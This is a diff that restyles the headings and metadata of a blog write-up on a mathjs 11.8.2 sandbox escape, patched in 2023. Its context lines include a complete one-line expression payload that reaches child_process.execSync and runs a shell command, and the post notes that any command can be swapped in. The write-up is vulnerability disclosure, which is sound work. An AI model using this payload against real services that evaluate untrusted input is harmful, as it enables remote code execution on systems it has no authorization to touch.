@@ -15,13 +15,13 @@
 
         <main>
             <article class="content">
+                <a class="back-link" href="../posts.html">← back to posts</a>
+
+                <div class="article-meta"><span class="am-tag">rce</span> · 2026-06-01 · 12 min read</div>
+
                 <h1>Escaping the mathjs Sandbox: From math.evaluate() to Remote Code Execution</h1>
 
-                <div class="post-meta" style="margin-bottom: 30px;">
-                    [2026-06-01] | Author: ribeirin | Reading time: 12 min
-                </div>
-
-                <div class="tags" style="margin-bottom: 30px;">
+                <div class="tags">
                     <span class="tag">rce</span>
                     <span class="tag">mathjs</span>
                     <span class="tag">sandbox escape</span>
@@ -29,7 +29,7 @@
                     <span class="tag">nodejs</span>
                 </div>
 
-                <h2>## Abstract</h2>
+                <h2>Abstract</h2>
 
                 <p>
                     While hunting on a bug bounty program I ran into a service that evaluated untrusted input with
@@ -48,7 +48,7 @@
                     which concerns public open-source code that was patched back in 2023.
                 </p>
 
-                <h2>## How I Ended Up Reading mathjs</h2>
+                <h2>How I Ended Up Reading mathjs</h2>
 
                 <p>
                     The trail started with one observation during recon: an input whose value came back <em>evaluated</em>,
@@ -59,7 +59,7 @@
                     the library, not the host.
                 </p>
 
-                <h2>## mathjs Is Not a Sandbox (But It Tries)</h2>
+                <h2>mathjs Is Not a Sandbox (But It Tries)</h2>
 
                 <p>
                     The maintainers state plainly that
@@ -109,7 +109,7 @@ function isSafeProperty (object, prop) {
                     is dead. The bug is that <code>11.8.2</code> has two reads that never call it.
                 </p>
 
-                <h2>## How mathjs Evaluates an Expression</h2>
+                <h2>How mathjs Evaluates an Expression</h2>
 
                 <p>
                     <code>math.evaluate(str)</code> runs in three stages. <code>parse(str)</code> builds an Abstract Syntax
@@ -127,9 +127,9 @@ function isSafeProperty (object, prop) {
                     <code>args</code> object is where the hole is.
                 </p>
 
-                <h2>## Root Cause: Two Unguarded Property Reads</h2>
+                <h2>Root Cause: Two Unguarded Property Reads</h2>
 
-                <h3>### Hole #1, FunctionNode._compile</h3>
+                <h3>Hole #1, FunctionNode._compile</h3>
 
                 <p>
                     When the thing being called is a bare symbol (e.g. <code>foo(...)</code>),
@@ -178,7 +178,7 @@ _compile (math, argNames) {
                     <code>Function('&lt;body&gt;')</code>, a brand-new JS function built from an attacker string.
                 </p>
 
-                <h3>### Hole #2, SymbolNode._compile</h3>
+                <h3>Hole #2, SymbolNode._compile</h3>
 
                 <p>The sibling node has the same class of bug for bare symbol reads:</p>
 
@@ -209,7 +209,7 @@ _compile (math, argNames) {
                     its prototype chain.
                 </p>
 
-                <h3>### Why "constructor" slips through</h3>
+                <h3>Why "constructor" slips through</h3>
 
                 <p>The branch that reaches the raw read is gated on the argument-name lookup:</p>
 
@@ -228,7 +228,7 @@ _compile (math, argNames) {
                     <code>args["constructor"]</code> is whatever constructor we choose, including <code>Function</code>.
                 </p>
 
-                <h2>## The 11.9.1 Fix</h2>
+                <h2>The 11.9.1 Fix</h2>
 
                 <p>
                     The patch (commit <code>6dcbc6b</code>) is tiny: it wraps both raw reads in <code>getSafeProperty</code>,
@@ -250,7 +250,7 @@ _compile (math, argNames) {
                     whole hole, and <code>11.8.2</code> predates the patch, so the hole is open.
                 </p>
 
-                <h2>## Building the Escape Primitive</h2>
+                <h2>Building the Escape Primitive</h2>
 
                 <p>
                     Putting the two holes together gives a clean primitive. Parsing
@@ -295,7 +295,7 @@ f()                                   // runs the body in the node.js process
 
                 <pre><code>[c=parse("constructor('return global.process.mainModule.require(`child_process`).execSync(`id`).toString()')")._compile(1,1),f=c(0,cos),f()][3]</code></pre>
 
-                <h2>## Proof of Concept</h2>
+                <h2>Proof of Concept</h2>
 
                 <p>
                     The whole thing reproduces offline against a stock <code>mathjs 11.8.2</code> install, no target involved:
@@ -335,7 +335,7 @@ evaluate  -> v18.20.8</code></pre>
                     Swapping <code>id</code> for <code>uname -a</code>, <code>hostname</code>, or any command works the same way.
                 </p>
 
-                <h2>## References</h2>
+                <h2>References</h2>
 
                 <ul>
                     <li><a href="https://mathjs.org/docs/expressions/security.html" target="_blank">mathjs - Expression evaluation security</a></li>
@@ -353,9 +353,6 @@ evaluate  -> v18.20.8</code></pre>
                 </div>
             </article>
 
-            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px dashed var(--text-dim);">
-                <a href="../posts.html">&lt;&lt; Back to Posts</a>
-            </div>
         </main>
 
         <div data-component="footer" data-base-path="../"></div>
